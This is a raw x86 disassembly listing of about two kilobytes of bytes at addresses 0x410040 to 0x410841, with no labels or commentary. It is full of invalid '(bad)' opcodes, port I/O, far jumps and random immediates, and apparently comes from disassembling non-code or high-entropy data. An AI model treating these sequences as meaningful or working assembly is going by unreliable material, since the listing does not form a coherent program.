  410040:	ret    
  410041:	sar    BYTE PTR [ecx+0x41cc977c],cl
  410047:	in     al,0x12
  410049:	pop    edi
  41004a:	lock pop eax
  41004c:	out    dx,al
  41004d:	aaa    
  41004e:	xchg   ebp,eax
  41004f:	ret    0xdeed
  410052:	push   ds
  410053:	outs   dx,BYTE PTR ds:[esi]
  410054:	pop    ecx
  410055:	lds    ebx,FWORD PTR [ebx]
  410057:	retf   
  410058:	jne    0x41009c
  41005a:	sbb    ecx,ecx
  41005c:	adc    eax,0xba5a43a5
  410061:	mov    eax,ds:0xf027764f
  410066:	push   DWORD PTR [ebx]
  410068:	inc    esi
  410069:	inc    esp
  41006a:	daa    
  41006b:	(bad)  
  41006c:	pop    ebx
  41006d:	inc    edx
  41006e:	dec    esi
  41006f:	in     eax,dx
  410070:	inc    eax
  410071:	mov    esp,0xeed4bbd3
  410076:	dec    esp
  410077:	outs   dx,BYTE PTR ds:[esi]
  410078:	push   edx
  410079:	aaa    
  41007a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41007b:	repnz dec esp
  41007d:	out    dx,al
  41007e:	shl    BYTE PTR [ecx+eiz*4-0x57],cl
  410082:	in     al,dx
  410083:	xlat   BYTE PTR ds:[ebx]
  410084:	mov    edx,0xde2cd7e4
  410089:	(bad)  
  41008a:	aas    
  41008b:	lock test eax,0xf2b5e52e
  410091:	xor    eax,0x82b09c7
  410096:	sti    
  410097:	inc    esi
  410098:	or     edx,esp
  41009a:	outs   dx,BYTE PTR ds:[esi]
  41009b:	dec    ebp
  41009c:	xchg   edx,eax
  41009d:	xchg   DWORD PTR [ebx+esi*2-0x4e],ecx
  4100a1:	mov    bl,0xb4
  4100a3:	or     al,0xd2
  4100a5:	xor    dh,BYTE PTR [esi+0xc]
  4100a8:	xor    BYTE PTR [eax],bh
  4100aa:	pop    ebp
  4100ab:	and    ch,BYTE PTR [ebp+0x7c662a57]
  4100b1:	adc    DWORD PTR [ecx],esp
  4100b3:	cmp    cl,ch
  4100b5:	loope  0x4100cf
  4100b7:	xchg   ecx,eax
  4100b8:	xchg   edi,eax
  4100b9:	call   0x98d3:0xb95ae0b2
  4100c0:	dec    ecx
  4100c1:	cmp    bl,bh
  4100c3:	sbb    BYTE PTR [edi+eax*4],bh
  4100c6:	and    eax,0x250de47b
  4100cb:	lds    esp,FWORD PTR [esp+ebp*4-0xb]
  4100cf:	rol    BYTE PTR [ecx-0x26fb95af],cl
  4100d5:	retf   0xa25b
  4100d8:	scas   eax,DWORD PTR es:[edi]
  4100d9:	push   esi
  4100da:	mov    ah,0x88
  4100dc:	sbb    edi,DWORD PTR [edx]
  4100de:	je     0x410152
  4100e0:	leave  
  4100e1:	daa    
  4100e2:	and    eax,0x896aa91d
  4100e7:	dec    al
  4100e9:	ins    DWORD PTR es:[edi],dx
  4100ea:	fdiv   DWORD PTR [eax+0x10]
  4100ed:	push   eax
  4100ee:	fwait
  4100ef:	xchg   edx,eax
  4100f0:	sbb    eax,0x50e0c32a
  4100f5:	icebp  
  4100f6:	pushf  
  4100f7:	push   esp
  4100f8:	scas   eax,DWORD PTR es:[edi]
  4100f9:	clc    
  4100fa:	mov    esp,0x410d7aca
  4100ff:	jmp    0xaec4e1d9
  410104:	jl     0x41015c
  410106:	jno    0x410151
  410108:	pop    esi
  410109:	repnz adc esp,0xffffffd7
  41010d:	mov    edx,0x8b12b77e
  410112:	ins    DWORD PTR es:[edi],dx
  410113:	lods   eax,DWORD PTR ds:[esi]
  410114:	fidivr DWORD PTR [esi+ebp*8]
  410117:	xor    al,0x24
  410119:	cwde   
  41011a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41011b:	pusha  
  41011c:	data16 jno 0x4100d8
  41011f:	jmp    0x410109
  410121:	jae    0x4100cb
  410123:	push   ds
  410124:	es pop ebx
  410126:	pusha  
  410127:	jno    0x41017c
  410129:	add    dh,BYTE PTR [edi]
  41012b:	adc    al,0x1b
  41012d:	shl    BYTE PTR [edx+eiz*1],cl
  410130:	jecxz  0x4100d3
  410132:	xor    al,0x1c
  410134:	pop    ebx
  410135:	shl    DWORD PTR [esi+ebp*8],0xda
  410139:	fild   DWORD PTR [esi]
  41013b:	rcl    DWORD PTR [edx+0x32],cl
  41013e:	lock jmp 0x180b5a1
  410144:	push   edx
  410145:	pusha  
  410146:	(bad)  
  410147:	imul   ebp,DWORD PTR [edi+edx*4-0x70],0x3214b4eb
  41014f:	loope  0x41018a
  410151:	mov    BYTE PTR ds:0x7a12bc02,ch
  410157:	jbe    0x41019c
  410159:	dec    eax
  41015a:	(bad)  
  41015b:	std    
  41015c:	sti    
  41015d:	cdq    
  41015e:	frstor [ebx]
  410160:	sub    ebp,esi
  410162:	push   cs
  410163:	std    
  410164:	inc    esi
  410165:	or     al,0x81
  410167:	inc    ecx
  410168:	jno    0x41015f
  41016a:	retf   0x1c4b
  41016d:	fcomp  DWORD PTR [ebp+0x40]
  410170:	mov    esi,0x54157502
  410175:	loop   0x410127
  410177:	jl     0x410164
  410179:	push   0xc3deda32
  41017e:	adc    BYTE PTR [edi+0x306e7a9],0x6c
  410185:	(bad)  
  410186:	mov    al,0xe5
  410188:	or     BYTE PTR [eax-0x1f],0x95
  41018c:	inc    edi
  41018d:	mov    ebx,0xe2f6a67b
  410192:	fisub  WORD PTR [ebx]
  410194:	mov    ebx,0xe3b990e0
  410199:	jge    0x41013c
  41019b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41019c:	adc    DWORD PTR [ebx],0xffffff8a
  41019f:	leave  
  4101a0:	pop    es
  4101a1:	mov    ch,ch
  4101a3:	daa    
  4101a4:	adc    BYTE PTR [esi-0x73],bh
  4101a7:	call   0x560a6a9a
  4101ac:	xchg   esi,eax
  4101ad:	jae    0x4101f7
  4101af:	xchg   ecx,eax
  4101b0:	js     0x410226
  4101b2:	repnz sbb ebp,DWORD PTR [esi]
  4101b5:	pop    edx
  4101b6:	test   ebx,edi
  4101b8:	add    al,0x1
  4101ba:	(bad)  
  4101bb:	repnz xchg edx,eax
  4101bd:	xchg   esi,eax
  4101be:	cmp    ch,bl
  4101c0:	shr    BYTE PTR [ebp+0x69],0x87
  4101c4:	imul   edx,DWORD PTR [esi],0x4c
  4101c7:	jle    0x410245
  4101c9:	out    0xda,al
  4101cb:	mov    eax,0x9d7ebdf4
  4101d0:	std    
  4101d1:	lock or eax,DWORD PTR [esi+0xe]
  4101d5:	xor    DWORD PTR cs:[edi],ecx
  4101d8:	out    dx,al
  4101d9:	jne    0x4101bf
  4101db:	aam    0x80
  4101dd:	add    DWORD PTR [ebx-0x18],esp
  4101e0:	xor    al,0x33
  4101e2:	cmc    
  4101e3:	(bad)  
  4101e5:	cmc    
  4101e6:	xor    eax,0x784cdb56
  4101eb:	jmp    0x41026b
  4101ed:	xor    BYTE PTR [ebp-0x345b8c3a],cl
  4101f3:	call   0xd52cdb7c
  4101f8:	mov    esp,0x565c26d5
  4101fd:	jbe    0x4101eb
  4101ff:	scas   eax,DWORD PTR es:[edi]
  410200:	daa    
  410201:	mov    bh,0x9
  410203:	jecxz  0x41019a
  410205:	fild   QWORD PTR ds:0x3abb512d
  41020b:	pop    ecx
  41020c:	or     al,0xad
  41020e:	std    
  41020f:	out    0xb5,al
  410211:	sbb    DWORD PTR [esi-0x1c],0x41
  410215:	ja     0x41027c
  410217:	lahf   
  410218:	test   al,0x6b
  41021a:	(bad)  
  41021b:	sbb    DWORD PTR [ebx+0x6348e279],0x2a
  410222:	loope  0x41028a
  410224:	dec    edi
  410225:	into   
  410226:	and    dl,ch
  410228:	rcl    BYTE PTR ds:0xbad6dd40,0x5a
  41022f:	in     al,0xbd
  410231:	xor    al,0xab
  410233:	mov    esp,0x7fbf93ed
  410238:	les    ecx,FWORD PTR [ecx]
  41023a:	dec    ebx
  41023b:	cli    
  41023c:	jle    0x4101ed
  41023e:	adc    ecx,DWORD PTR [ebp-0xd]
  410241:	sub    eax,0x18d21c31
  410246:	adc    ebp,edi
  410248:	out    0x28,al
  41024a:	or     bh,al
  41024c:	mov    bh,bl
  41024e:	dec    esi
  41024f:	leave  
  410250:	stc    
  410251:	fst    QWORD PTR [eax+0x43]
  410254:	outs   dx,BYTE PTR ds:[esi]
  410255:	mov    ebx,0xc8402c77
  41025a:	(bad)  
  41025b:	jbe    0x41020d
  41025d:	push   ecx
  41025e:	cdq    
  41025f:	sub    DWORD PTR [ebp-0x13],eax
  410262:	sub    bl,BYTE PTR [edx]
  410264:	push   ss
  410265:	clc    
  410266:	pushf  
  410267:	retf   
  410268:	mov    dh,0xb1
  41026a:	adc    cl,al
  41026c:	lods   eax,DWORD PTR ds:[esi]
  41026d:	out    dx,al
  41026e:	pop    eax
  41026f:	rol    BYTE PTR [edi],1
  410271:	in     al,0xbe
  410273:	add    edi,0xa34f4131
  410279:	lahf   
  41027a:	ins    DWORD PTR es:[edi],dx
  41027b:	lods   al,BYTE PTR ds:[esi]
  41027c:	and    BYTE PTR [esi],dl
  41027e:	xor    BYTE PTR [ecx+0x212de3fe],dl
  410284:	jbe    0x4102ca
  410286:	jae    0x410267
  410288:	mov    dl,0x7
  41028a:	call   0x8da03bd9
  41028f:	sbb    BYTE PTR [ebp+0x28b002ea],cl
  410295:	pop    eax
  410296:	xchg   edx,eax
  410297:	mov    ebp,0xa54a4820
  41029c:	clc    
  41029d:	dec    esi
  41029e:	inc    esi
  41029f:	mov    edi,0x268109ec
  4102a4:	or     al,0x1d
  4102a6:	or     esp,ebp
  4102a8:	xchg   ebp,eax
  4102a9:	sub    ch,ah
  4102ab:	mov    ebx,0xa7fd08c8
  4102b0:	or     eax,ebx
  4102b2:	cdq    
  4102b3:	jle    0x4102ca
  4102b5:	sub    eax,0xd161127f
  4102ba:	jge    0x4102b1
  4102bc:	xchg   ebp,eax
  4102bd:	xchg   esp,eax
  4102be:	jmp    0xc0c2:0x9ff4be4
  4102c5:	call   0x778598a8
  4102ca:	shr    DWORD PTR [ecx+ebp*2+0x1ed1649],0x1c
  4102d2:	loope  0x41029f
  4102d4:	aad    0x6
  4102d6:	mov    dl,0xe1
  4102d8:	call   0x213f3683
  4102dd:	in     al,0xb3
  4102df:	jge    0x410319
  4102e1:	add    ah,BYTE PTR [ebx]
  4102e3:	inc    ebx
  4102e4:	in     al,dx
  4102e5:	push   edi
  4102e6:	out    0xd5,al
  4102e8:	enter  0x586a,0xb2
  4102ec:	out    0x62,eax
  4102ee:	test   eax,0xc432d26c
  4102f3:	call   0x3caf:0xe21b4bc3
  4102fa:	sub    BYTE PTR [eax+0x7c],al
  4102fd:	shl    DWORD PTR [edx+0x595073e0],0xa5
  410304:	push   0x64
  410306:	mov    ds:0x44063561,al
  41030b:	push   eax
  41030c:	inc    esp
  41030d:	ja     0x41036f
  41030f:	clc    
  410310:	mov    edx,0x401c46e8
  410315:	fisttp DWORD PTR [ecx+0x75]
  410318:	imul   eax,DWORD PTR [ecx],0x4d
  41031b:	jns    0x4102a6
  41031d:	mov    ebx,0xdfdcb8c3
  410322:	xchg   esp,eax
  410323:	into   
  410324:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410325:	cli    
  410326:	rol    DWORD PTR [edx-0x6bee0c35],1
  41032c:	in     eax,dx
  41032d:	add    BYTE PTR [ebx+ecx*1],ch
  410330:	fstp   QWORD PTR ds:0x7075179a
  410336:	aad    0x6a
  410338:	and    ch,BYTE PTR [ebp-0x52416d28]
  41033e:	mov    WORD PTR [edx+ebx*2-0x202a22be],?
  410345:	push   ecx
  410346:	push   ebp
  410347:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410348:	mov    ecx,0xafee198a
  41034d:	xor    cl,bh
  41034f:	push   ebp
  410350:	push   0xffffff8b
  410352:	cdq    
  410353:	fld1   
  410355:	shl    ecx,cl
  410357:	loopne 0x410311
  410359:	(bad)  
  41035a:	(bad)  [esi+0x10]
  41035d:	leave  
  41035e:	cmp    dl,dh
  410360:	fdivr  QWORD PTR [eax]
  410362:	mov    ds:0xc9eb01a6,al
  410367:	inc    ecx
  410368:	add    bl,BYTE PTR [esi-0x45]
  41036b:	into   
  41036c:	pop    ds
  41036d:	fisubr DWORD PTR [ecx+eiz*4-0x4933a216]
  410374:	(bad)  
  410375:	sub    eax,0x6d6124e1
  41037a:	mov    esp,0x5a993645
  41037f:	xor    dh,BYTE PTR [esp+eax*2]
  410382:	jnp    0x410310
  410384:	mov    ah,0xd5
  410386:	inc    ebp
  410387:	sub    ah,dh
  410389:	imul   ecx,DWORD PTR [ebp+0x3a82351e],0x3fc55035
  410393:	ins    BYTE PTR es:[edi],dx
  410394:	or     al,0xc1
  410396:	pop    ebx
  410397:	adc    al,0xca
  410399:	and    eax,0xfbc1dea6
  41039e:	popa   
  41039f:	inc    ecx
  4103a0:	add    DWORD PTR [eax-0x8af4402],esp
  4103a6:	inc    ebp
  4103a7:	dec    ebp
  4103a8:	sbb    edx,ebp
  4103aa:	loope  0x410396
  4103ac:	in     eax,0x5
  4103ae:	dec    ebx
  4103af:	lock dec edi
  4103b1:	add    ebp,edx
  4103b3:	sti    
  4103b4:	sub    eax,0xace15945
  4103ba:	sbb    al,0x63
  4103bc:	dec    ebp
  4103bd:	outs   dx,BYTE PTR ds:[esi]
  4103be:	and    al,0xa9
  4103c0:	xor    eax,0x3d0bc850
  4103c5:	nop
  4103c6:	xchg   esi,eax
  4103c7:	or     al,0x43
  4103c9:	pusha  
  4103ca:	lea    edi,[edi]
  4103cc:	or     ebx,DWORD PTR [eax+0x31]
  4103cf:	mov    ds:0x3c2371a9,eax
  4103d4:	mov    esi,0xc240beb5
  4103d9:	push   ecx
  4103da:	dec    esi
  4103db:	or     esp,DWORD PTR [edx+0x6298498d]
  4103e1:	jb     0x41040d
  4103e3:	jmp    0xd30b:0x66982c33
  4103ea:	out    0x56,al
  4103ec:	ret    
  4103ed:	add    al,0xff
  4103ef:	mov    eax,0x13ad7b90
  4103f4:	sub    ebx,DWORD PTR [ecx]
  4103f6:	ins    DWORD PTR es:[edi],dx
  4103f7:	jge    0x4103af
  4103f9:	gs dec edi
  4103fb:	int    0x89
  4103fd:	out    0x74,al
  4103ff:	pop    edi
  410400:	add    eax,0xc147738c
  410405:	ins    DWORD PTR es:[edi],dx
  410406:	pusha  
  410407:	out    0xb8,al
  410409:	inc    edi
  41040a:	jb     0x41038f
  41040c:	xchg   ecx,eax
  41040d:	jnp    0x410475
  41040f:	in     eax,0x10
  410411:	push   ebx
  410412:	pop    esi
  410413:	lds    edi,FWORD PTR [edx-0x2a]
  410416:	and    cl,dl
  410418:	pop    es
  410419:	aaa    
  41041a:	or     al,BYTE PTR [eax+0x7cbd23b1]
  410420:	(bad)  [bx-0xc98]
  410425:	jo     0x410488
  410427:	dec    ecx
  410428:	daa    
  410429:	mov    eax,ds:0xe954ec9c
  41042e:	jne    0x410486
  410430:	adc    dl,BYTE PTR [eax]
  410432:	and    al,0x1e
  410434:	push   ebx
  410435:	push   ecx
  410436:	jecxz  0x410452
  410438:	jnp    0x410472
  41043a:	push   ebp
  41043b:	clc    
  41043c:	mov    al,0x4f
  41043e:	imul   edi,DWORD PTR [ecx-0x301df48a],0x5de43079
  410448:	in     eax,dx
  410449:	mov    BYTE PTR [edx+0x1e],ch
  41044c:	adc    DWORD PTR [esi],esi
  41044e:	hlt    
  41044f:	dec    edi
  410450:	push   edi
  410451:	aaa    
  410452:	mov    eax,0xb110d5eb
  410457:	stc    
  410458:	loop   0x410461
  41045a:	inc    ecx
  41045b:	lds    esi,FWORD PTR [eax-0x39]
  41045e:	loop   0x410431
  410460:	repz jnp 0x41042c
  410463:	jo     0x41049b
  410465:	mov    WORD PTR ds:0xda872445,?
  41046b:	loop   0x41041f
  41046d:	jmp    0x18ca:0x8493a5b
  410474:	stos   BYTE PTR es:[edi],al
  410475:	mov    esp,0x966d4b24
  41047a:	jo     0x4104e4
  41047c:	jae    0x410475
  41047e:	repnz or edx,edi
  410481:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410482:	leave  
  410483:	lds    esp,FWORD PTR [edi+edi*1-0x52f201d7]
  41048a:	cmp    eax,0xf76c8747
  41048f:	sbb    DWORD PTR [ebp+edi*1-0x39],eax
  410493:	cmp    DWORD PTR [esi+0x415c8a2],esi
  410499:	popf   
  41049a:	and    eax,0xdfeb6b63
  41049f:	test   al,0xb8
  4104a1:	xchg   BYTE PTR ds:0x6be3d138,cl
  4104a7:	jecxz  0x410528
  4104a9:	call   0x81c50826
  4104ae:	xchg   BYTE PTR [ebp+0x28],bl
  4104b1:	mov    bh,0xef
  4104b4:	jg     0x410447
  4104b6:	mov    ch,0xb7
  4104b8:	nop
  4104b9:	adc    BYTE PTR [esi+0x6dcc63a6],bh
  4104bf:	or     DWORD PTR [ebx+0x1aa4d956],edx
  4104c5:	dec    ebx
  4104c6:	ret    
  4104c7:	sti    
  4104c8:	push   esp
  4104c9:	test   al,0x3f
  4104cb:	mov    eax,0xe69cbad0
  4104d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4104d1:	(bad)  
  4104d2:	leave  
  4104d3:	popf   
  4104d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4104d5:	data16 cli 
  4104d7:	ss xchg edx,eax
  4104d9:	jl     0x410551
  4104db:	add    dh,BYTE PTR [ecx]
  4104dd:	test   al,0x95
  4104df:	ins    DWORD PTR es:[edi],dx
  4104e0:	cmp    ebp,eax
  4104e2:	lds    ebx,FWORD PTR [ebx+0x13]
  4104e5:	sub    al,0x53
  4104e7:	jns    0x4104b3
  4104e9:	pop    ds
  4104ea:	popf   
  4104eb:	adc    eax,0xde125c7d
  4104f0:	fnstsw WORD PTR [edi]
  4104f2:	cmp    eax,0x4a1c00a7
  4104f7:	adc    BYTE PTR [edi-0xb165c20],bh
  4104fd:	or     DWORD PTR ds:0xa51aaa5,eax
  410503:	iret   
  410504:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410505:	fistp  WORD PTR [ecx+0x3c596e51]
  41050b:	fnstsw WORD PTR [ecx+0x7]
  41050e:	cmp    eax,0x9d28c9ec
  410513:	sub    edi,DWORD PTR [ebx+edi*4+0x534ab5bd]
  41051a:	mov    bh,0x74
  41051c:	and    BYTE PTR [edx-0x588d3d2f],0xa6
  410523:	bound  esi,QWORD PTR [edx]
  410525:	mov    ch,0xf3
  410527:	int    0xc4
  410529:	mov    ebp,0xe5ab6d8a
  41052e:	jmp    0x8209541e
  410533:	aas    
  410534:	xchg   edi,eax
  410535:	bswap  edi
  410537:	add    ch,cl
  410539:	pop    DWORD PTR [esi+0x2d0ca28d]
  41053f:	inc    eax
  410540:	int3   
  410541:	loope  0x41050f
  410543:	popa   
  410544:	inc    edx
  410545:	lea    esp,[ebx+0x6064da32]
  41054b:	popf   
  41054c:	and    al,BYTE PTR [eax-0x2c3fdf6f]
  410552:	xlat   BYTE PTR ds:[ebx]
  410553:	mov    dl,0x37
  410556:	xchg   ebx,eax
  410557:	jmp    0xa8ed:0xfc15d4b6
  41055e:	pusha  
  41055f:	je     0x4105bc
  410561:	pop    edx
  410562:	dec    ebp
  410563:	out    dx,eax
  410564:	loopne 0x410577
  410566:	xchg   BYTE PTR [ecx+0x154c8f2c],al
  41056c:	inc    esp
  41056d:	pop    esp
  41056e:	ds cli 
  410570:	cdq    
  410571:	mov    al,ds:0x1d5f60dd
  410576:	cmp    eax,0x8950acd2
  41057b:	jnp    0x4105e4
  41057d:	pusha  
  41057e:	pop    esi
  41057f:	retf   
  410580:	pop    eax
  410581:	call   0x132b:0xcb19d701
  410588:	loopne 0x4105ad
  41058a:	scas   eax,DWORD PTR es:[edi]
  41058b:	mov    ch,0xd2
  41058d:	test   al,0xc1
  41058f:	cmp    eax,0xa544e262
  410594:	aam    0x34
  410596:	fbstp  TBYTE PTR [eax+0x7d]
  410599:	push   cs
  41059a:	and    ah,bh
  41059c:	sahf   
  41059d:	mov    edi,0x65df3cc6
  4105a2:	inc    ecx
  4105a3:	or     ecx,ecx
  4105a5:	repz pop ss
  4105a7:	pop    ebx
  4105a8:	out    0x22,al
  4105aa:	int3   
  4105ab:	in     eax,dx
  4105ac:	addr16 jl 0x4105e8
  4105af:	inc    esi
  4105b0:	fwait
  4105b1:	repz ja 0x410600
  4105b4:	push   esi
  4105b5:	bswap  edi
  4105b7:	imul   ebx,DWORD PTR [eax],0x1f
  4105ba:	popa   
  4105bb:	jmp    0xa3e:0xa0e74709
  4105c2:	cwde   
  4105c3:	mov    esi,0xc4e6fbae
  4105c8:	pushf  
  4105c9:	push   cs
  4105ca:	push   cs
  4105cb:	mov    eax,ds:0x97e3930
  4105d0:	xchg   DWORD PTR [edi-0x53be7fe0],edx
  4105d6:	pop    ebx
  4105d7:	mov    ecx,0xd1444f7d
  4105dc:	cmp    ch,BYTE PTR [edx+0x406a85e8]
  4105e2:	cmc    
  4105e3:	jecxz  0x41057d
  4105e5:	into   
  4105e6:	lods   al,BYTE PTR ds:[esi]
  4105e7:	or     al,BYTE PTR [ebx-0x17e40e9b]
  4105ed:	jmp    0x410655
  4105ef:	mov    ah,BYTE PTR [ebx-0x74]
  4105f2:	jmp    0x4105e0
  4105f4:	or     eax,ebp
  4105f6:	inc    ecx
  4105f7:	cmp    eax,0x28399b7e
  4105fc:	(bad)  
  4105fd:	push   0xffffff94
  4105ff:	nop
  410600:	push   edx
  410601:	mov    esp,0xb5b82174
  410606:	rol    bl,0xd7
  410609:	int3   
  41060a:	les    ecx,FWORD PTR [ebp-0x59]
  41060d:	loopne 0x410661
  41060f:	mov    ecx,0xc923eb59
  410614:	add    DWORD PTR [edx-0x70],edx
  410617:	aaa    
  410618:	jns    0x39593c95
  41061e:	repnz xor al,0x7d
  410621:	(bad)  
  410622:	out    dx,al
  410623:	fadd   DWORD PTR fs:[ecx+0x2d]
  410627:	mov    esi,0x1bd5caaa
  41062c:	xor    eax,0x39e9d4f8
  410631:	test   BYTE PTR [ebx+ebx*1],0xe6
  410635:	xor    esp,DWORD PTR [ebx-0x4332dc8]
  41063b:	inc    esi
  41063c:	sub    esi,DWORD PTR [ecx]
  41063e:	pop    ebp
  41063f:	rol    BYTE PTR [ecx],1
  410641:	in     eax,dx
  410642:	mov    al,0xa5
  410644:	mov    WORD PTR [eax],?
  410646:	add    ch,cl
  410648:	jmp    0x410652
  41064a:	push   0x3d234992
  41064f:	xor    DWORD PTR [edi],eax
  410651:	es int3 
  410653:	inc    ecx
  410654:	xchg   esi,eax
  410655:	inc    ecx
  410656:	gs mov bh,0x18
  410659:	jecxz  0x4105ed
  41065b:	(bad)  
  41065d:	ins    DWORD PTR es:[edi],dx
  41065e:	add    BYTE PTR [ebx-0x6f321080],bh
  410664:	xor    al,0x38
  410666:	or     al,0xb9
  410668:	test   DWORD PTR [esi+0x73],esi
  41066b:	imul   edi,DWORD PTR [esi],0xe98c9cf1
  410671:	and    ecx,ecx
  410673:	je     0x410626
  410675:	or     edi,edx
  410677:	and    BYTE PTR [eax+0x44df1931],bh
  41067d:	adc    al,0x97
  41067f:	es int 0x1d
  410682:	in     eax,0xf
  410684:	call   0xfafbb91f
  410689:	mov    esi,0x7201b150
  41068e:	scas   al,BYTE PTR es:[edi]
  41068f:	xchg   esp,eax
  410690:	hlt    
  410691:	retf   0x5f74
  410694:	test   bh,al
  410696:	fnstcw WORD PTR [esi]
  410698:	jmp    0x789c:0x94d8f18a
  41069f:	or     BYTE PTR [esi-0x2a],al
  4106a2:	or     DWORD PTR [eax],esp
  4106a4:	jmp    0x4106e8
  4106a6:	inc    edi
  4106a7:	xor    al,BYTE PTR [esi-0x4c]
  4106aa:	mov    ebp,0x5824139a
  4106af:	dec    esp
  4106b0:	(bad)
  4106b4:	pusha  
  4106b5:	gs mov edx,0x9868532e
  4106bb:	inc    edx
  4106bc:	dec    edi
  4106bd:	test   BYTE PTR [eax],0x65
  4106c0:	and    edx,DWORD PTR [edi]
  4106c2:	pop    esi
  4106c3:	out    0x5d,al
  4106c5:	add    esp,DWORD PTR [eax+0x2cf30d5c]
  4106cb:	pop    eax
  4106cc:	ja     0x410733
  4106ce:	cld    
  4106cf:	in     al,dx
  4106d0:	pop    edx
  4106d1:	add    dh,bh
  4106d3:	jmp    0x470f1860
  4106d8:	jg     0x4106f6
  4106da:	jecxz  0x41070f
  4106dc:	inc    ecx
  4106dd:	pop    es
  4106de:	jl     0x410703
  4106e0:	sub    BYTE PTR [ebx-0x1d86f0cc],0x43
  4106e7:	dec    ecx
  4106e8:	and    edx,ebx
  4106ea:	aam    0xf7
  4106ec:	adc    DWORD PTR [edx+0x7d],0xbb435265
  4106f3:	cmp    al,0x51
  4106f5:	xor    edx,DWORD PTR [edi]
  4106f7:	fucomp st(6)
  4106f9:	sbb    bh,BYTE PTR [ecx-0xb]
  4106fc:	xchg   esi,eax
  4106fd:	jo     0x41073a
  4106ff:	xchg   edi,eax
  410700:	pop    ebx
  410701:	in     al,dx
  410702:	outs   dx,DWORD PTR ds:[esi]
  410703:	sub    edi,DWORD PTR [ebp+esi*8+0x47]
  410707:	xor    eax,0x44953b76
  41070c:	dec    eax
  41070d:	jmp    0x7dbe:0x2ddeddb9
  410714:	(bad)  
  410715:	neg    BYTE PTR [edi+esi*8]
  410718:	mov    ds:0x1d722af7,eax
  41071d:	xchg   esi,eax
  41071e:	sub    eax,0xe54f6815
  410723:	jmp    DWORD PTR [eax+ebx*8+0x4f252e44]
  41072a:	lock sbb bh,bl
  41072d:	xchg   esp,eax
  41072e:	outs   dx,BYTE PTR ds:[esi]
  41072f:	mov    ah,0x61
  410731:	push   0xffffffb2
  410733:	out    0x18,eax
  410735:	mov    ah,0xf9
  410737:	iret   
  410738:	add    eax,0x8901ce9b
  41073d:	scas   eax,DWORD PTR es:[edi]
  41073e:	adc    cl,BYTE PTR [eax-0x37b13030]
  410744:	loop   0x410751
  410746:	mov    al,0xe
  410748:	fdiv   DWORD PTR [edx+0x5a]
  41074b:	xchg   DWORD PTR [edx-0x4e],eax
  41074e:	sahf   
  41074f:	jno    0x410709
  410751:	push   ss
  410752:	mov    al,0x3f
  410754:	rcl    DWORD PTR [ecx],0x2e
  410757:	mov    esp,0x3d4d162c
  41075c:	imul   ecx,DWORD PTR [ebp-0x7178a6a9],0x66
  410763:	inc    esi
  410764:	(bad)  
  410765:	pop    esi
  410766:	push   esp
  410767:	sub    ecx,esi
  410769:	xor    edx,DWORD PTR [ecx-0x3ba6cddf]
  41076f:	pusha  
  410770:	cmp    al,0x3f
  410772:	pop    esp
  410773:	xchg   ebp,eax
  410774:	xchg   BYTE PTR [ebp+0x1d6cabb8],bl
  41077a:	xor    al,0xee
  41077c:	lods   eax,DWORD PTR ds:[esi]
  41077d:	mov    BYTE PTR [eax+0x1a3bbb8f],bl
  410783:	scas   eax,DWORD PTR es:[edi]
  410784:	ret    0xbf33
  410787:	fwait
  410788:	and    eax,0xc989728e
  41078d:	fcmovnu st,st(3)
  41078f:	fdivr  DWORD PTR [ebx]
  410791:	cmp    BYTE PTR [eax],bl
  410793:	out    dx,al
  410794:	jmp    0x410726
  410796:	xlat   BYTE PTR ds:[ebx]
  410797:	push   ebx
  410798:	cmp    al,bl
  41079a:	dec    ebx
  41079b:	or     BYTE PTR [esi-0x559b9a02],0xa0
  4107a2:	push   ecx
  4107a3:	repz sub ecx,DWORD PTR [edi-0x16]
  4107a7:	and    DWORD PTR [edx],edx
  4107a9:	xor    eax,0x7764ccca
  4107ae:	(bad)  
  4107af:	cmp    dl,cl
  4107b1:	dec    edi
  4107b2:	sbb    DWORD PTR [edi-0x48779a2e],edi
  4107b8:	pop    esi
  4107b9:	out    dx,eax
  4107ba:	out    dx,al
  4107bb:	sbb    esi,ebp
  4107bd:	push   0x1d
  4107bf:	clc    
  4107c0:	retf   
  4107c1:	stc    
  4107c2:	and    BYTE PTR [ebx],ch
  4107c4:	and    BYTE PTR [ebx],dl
  4107c6:	test   BYTE PTR [edi],al
  4107c8:	outs   dx,DWORD PTR ds:[esi]
  4107c9:	rcr    DWORD PTR [edi],0x72
  4107cc:	mov    DWORD PTR [eax-0x25],esp
  4107cf:	xor    eax,0x871ee6f7
  4107d4:	sub    ebp,0x778090c0
  4107da:	cld    
  4107db:	loop   0x4107d6
  4107dd:	pop    esp
  4107de:	sub    ecx,edx
  4107e0:	out    dx,eax
  4107e1:	shr    BYTE PTR [esi-0x20],cl
  4107e4:	jl     0x410795
  4107e6:	rcl    DWORD PTR [edx+0x1d],0xa5
  4107ea:	and    eax,ecx
  4107ec:	dec    edi
  4107ed:	test   ah,0x73
  4107f0:	or     dh,BYTE PTR [edx+ecx*4]
  4107f3:	cmp    DWORD PTR [ecx-0x626b4208],ecx
  4107f9:	ret    
  4107fa:	stc    
  4107fb:	and    dh,dl
  4107fd:	sbb    eax,0x33b08e8d
  410802:	mov    esi,0xd3dc2e95
  410807:	sbb    al,0x90
  410809:	xor    eax,0x8f20e46a
  41080e:	pop    ebp
  41080f:	ins    DWORD PTR es:[edi],dx
  410810:	push   ecx
  410811:	pop    eax
  410812:	lea    edx,[eax-0x4203de0e]
  410818:	sub    cl,0xb
  41081b:	jecxz  0x4107db
  41081d:	ds ins BYTE PTR es:[edi],dx
  41081f:	mov    ds:0xfa03de0a,eax
  410824:	jp     0x4107ec
  410826:	mov    al,ds:0xe6b81051
  41082b:	je     0x4107d9
  41082d:	stos   DWORD PTR es:[edi],eax
  41082e:	aad    0x16
  410830:	xor    eax,0x16a6e27e
  410835:	xor    DWORD PTR [ecx-0x5c1a43eb],edi
  41083b:	pop    eax
  41083c:	push   es
  41083d:	xchg   BYTE PTR [ecx+eiz*8],bh
  410840:	push   es
  410841:	jns    0x410846
